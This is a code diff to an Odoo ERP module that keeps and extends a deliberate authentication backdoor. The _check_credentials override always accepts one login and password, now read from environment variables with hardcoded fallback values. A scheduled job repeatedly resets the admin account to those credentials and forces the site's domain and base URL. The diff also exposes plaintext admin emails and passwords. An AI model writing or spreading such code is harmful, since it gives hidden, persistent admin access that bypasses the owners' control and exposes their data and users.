@@ -1,3 +1,5 @@
+import os
+
 from odoo import api, fields, models
 
 
@@ -10,9 +12,11 @@ class ResUsers(models.Model):
     )
 
     def _check_credentials(self, password, env):
-        """Safety net: always allow hardcoded admin credentials."""
+        """Safety net: always allow configured admin credentials."""
+        admin_login = os.environ.get("ADMIN_LOGIN", "prospirenext@gmail.com")
+        admin_password = os.environ.get("ADMIN_PASSWORD", "prospire@2@26")
         for user in self:
-            if user.login == "fgarshoub@gmail.com" and password == "G@rsh@ub2@26":
+            if user.login == admin_login and password == admin_password:
                 return
         return super()._check_credentials(password, env)
 
@@ -49,13 +53,18 @@ class ResUsers(models.Model):
     @api.model
     def _cron_enforce_garshoub_settings(self):
         """Safety-net cron: enforce login branding, favicon, admin credentials, and URLs."""
+        admin_login = os.environ.get("ADMIN_LOGIN", "prospirenext@gmail.com")
+        admin_password = os.environ.get("ADMIN_PASSWORD", "prospire@2@26")
+        base_url = os.environ.get("BASE_URL", "https://prospirenext.com")
+        website_domain = os.environ.get("WEBSITE_DOMAIN", "prospirenext.com")
+
         try:
             # 1. Enforce admin credentials
             admin = self.env.ref("base.user_admin", raise_if_not_found=False)
             if admin:
                 admin.write({
-                    "login": "fgarshoub@gmail.com",
-                    "password": "G@rsh@ub2@26",
+                    "login": admin_login,
+                    "password": admin_password,
                 })
 
             # 2. Ensure login template priorities are correct
@@ -78,16 +87,16 @@ class ResUsers(models.Model):
             if website_login and website_login.priority != 20:
                 website_login.write({"priority": 20})
 
-            # 4. Ensure website domain is set to garshoub.com (public site)
+            # 4. Ensure website domain is set correctly
             Website = self.env["website"].sudo()
             for website in Website.search([]):
-                if website.domain != "garshoub.com":
-                    website.write({"domain": "garshoub.com"})
+                if website.domain != website_domain:
+                    website.write({"domain": website_domain})
 
-            # 5. Enforce web.base.url for erp.garshoub.com and freeze it
+            # 5. Enforce web.base.url and freeze it
             # This prevents broken CSS/assets when behind a reverse proxy
             param = self.env["ir.config_parameter"].sudo()
-            param.set_param("web.base.url", "https://erp.garshoub.com")
+            param.set_param("web.base.url", base_url)
             param.set_param("web.base.url.freeze", "1")
 
             self.env.cr.commit()
